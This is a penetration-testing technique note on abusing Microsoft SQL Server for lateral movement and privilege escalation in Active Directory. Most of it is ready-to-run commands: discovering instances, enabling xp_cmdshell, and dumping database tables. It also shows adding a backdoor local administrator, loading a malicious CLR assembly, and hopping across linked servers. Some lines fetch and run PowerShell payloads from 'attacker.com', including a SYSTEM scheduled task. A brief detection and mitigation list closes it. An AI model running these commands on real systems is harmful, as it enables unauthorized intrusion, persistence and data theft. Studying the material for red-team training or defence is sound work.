---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#tactic/TA0004"
  - "#technique/T1078.002"
  - "#technique/T1059.003"
  - "#stage/lateral-movement"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#service/mssql"
  - "#tool/powerupsql"
  - "#tool/impacket"
aliases:
  - SQL Server Exploitation
  - MSSQL Command Execution
  - SQL Server Lateral Movement
---

## Technique
___

Microsoft SQL Server (MSSQL) abuse involves leveraging SQL Server instances for lateral movement, privilege escalation, and persistence within an Active Directory environment. SQL Servers often run with high privileges and have features that can be exploited to execute operating system commands, access sensitive data, or pivot to other systems.

These servers frequently operate using service accounts with domain privileges or are installed with excessive permissions, making them high-value targets for attackers. Once an attacker gains access to a SQL Server, various techniques can be used to escalate privileges and move laterally through the network.

## Prerequisites
___

**Access Level:** 
- Valid SQL Server credentials (SQL authentication or Windows authentication)
- Network access to the SQL Server instance (typically port 1433 or custom ports)

**System State:**
- Target environment must have MSSQL Server instances
- Ideally, extended stored procedures like xp_cmdshell are available or can be enabled

## Identification
___

### Discovering SQL Server Instances

Using PowerUpSQL (PowerShell):
```powershell
# Import the module
Import-Module .\PowerUpSQL.ps1

# Discover SQL instances in the domain
Get-SQLInstanceDomain

# Get detailed information about discovered instances
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

Using other methods:
```
# Port scanning
nmap -p 1433 10.0.0.0/24

# LDAP query for SQL Server SPNs
ldapsearch -x -h dc01.domain.local -D "cn=user,dc=domain,dc=local" -w "password" -b "dc=domain,dc=local" "servicePrincipalName=MSSQL*"
```

## Connection
___

### Connecting to SQL Server

**From Windows using PowerUpSQL:**
```powershell
# Using Windows authentication
Get-SQLQuery -Verbose -Instance "SQLSERVER01.domain.local,1433" -query "SELECT @@version"

# Using SQL authentication
Get-SQLQuery -Verbose -Instance "SQLSERVER01.domain.local,1433" -username "sa" -password "Password123" -query "SELECT @@version"

# Using Windows authentication with specific credentials
Get-SQLQuery -Verbose -Instance "SQLSERVER01.domain.local,1433" -username "domain.local\user" -password "Password123" -query "SELECT @@version"
```

**From Linux using Impacket:**
```bash
# Using Windows authentication
impacket-mssqlclient domain.local/user:password@SQLSERVER01.domain.local -windows-auth

# Using SQL authentication
impacket-mssqlclient sa:password@SQLSERVER01.domain.local
```

## Exploitation
___

### Command Execution via xp_cmdshell

The xp_cmdshell extended stored procedure allows execution of operating system commands through SQL Server:

**Enable xp_cmdshell if disabled:**
```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

**Execute commands:**
```sql
-- Basic command execution
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'whoami /priv'
EXEC xp_cmdshell 'net user'

-- Execution with Impacket
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

### Data Exfiltration

Access sensitive information from databases:
```sql
-- List all databases
SELECT name FROM master.dbo.sysdatabases

-- List all tables in a database
SELECT table_name FROM [database_name].information_schema.tables

-- Extract data from a specific table
SELECT * FROM [database_name].[schema_name].[table_name]
```

### Lateral Movement Techniques

**Deploy and execute payload:**
```sql
-- Write a file to disk
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1") > C:\Windows\Temp\payload.ps1'

-- Execute the payload
EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'
```

**Create and add user to local administrators:**
```sql
EXEC xp_cmdshell 'net user hacker Password123 /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'
```

**Scheduled tasks:**
```sql
EXEC xp_cmdshell 'schtasks /create /tn "Maintenance" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/backdoor.ps1'')" /sc ONCE /st 23:00 /ru "SYSTEM"'
```

### Linked Servers Abuse

SQL Server linked servers allow for executing queries across different database servers:

```sql
-- List linked servers
EXEC sp_linkedservers

-- Execute commands on linked servers
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer]
```

### CLR Integration

Custom CLR (Common Language Runtime) assemblies can be used for execution:

```sql
-- Enable CLR integration
EXEC sp_configure 'clr enabled', 1
RECONFIGURE

-- Create malicious assembly (simplified example)
CREATE ASSEMBLY malicious FROM 0x4D5A90000...
CREATE PROCEDURE ExecuteCmd AS EXTERNAL NAME malicious.StoredProcedures.ExecuteCmd
EXEC ExecuteCmd 'whoami'
```

## Detection & Mitigation
___

### Detection

- Monitor for SQL Server authentication events, particularly from unusual sources
- Look for configuration changes to extended stored procedures, especially xp_cmdshell
- Audit for creation of SQL Server objects like assemblies, stored procedures, and triggers
- Monitor for unusual query patterns or commands executed via SQL Server
- Watch for file system activity initiated by the SQL Server service account

### Mitigation

- Disable or restrict access to dangerous extended stored procedures like xp_cmdshell
- Implement the principle of least privilege for SQL Server service accounts
- Use contained databases and contained authentication to avoid lateral movement
- Regularly audit SQL Server permissions and roles
- Enable SQL Server auditing to log suspicious activities
- Use Windows Defender Application Control to restrict SQL Server's ability to execute code
- Keep SQL Server and Windows updated with the latest security patches
- Implement network segmentation to limit connectivity to and from SQL Servers
- Use Always Encrypted for sensitive data to prevent unauthorized data access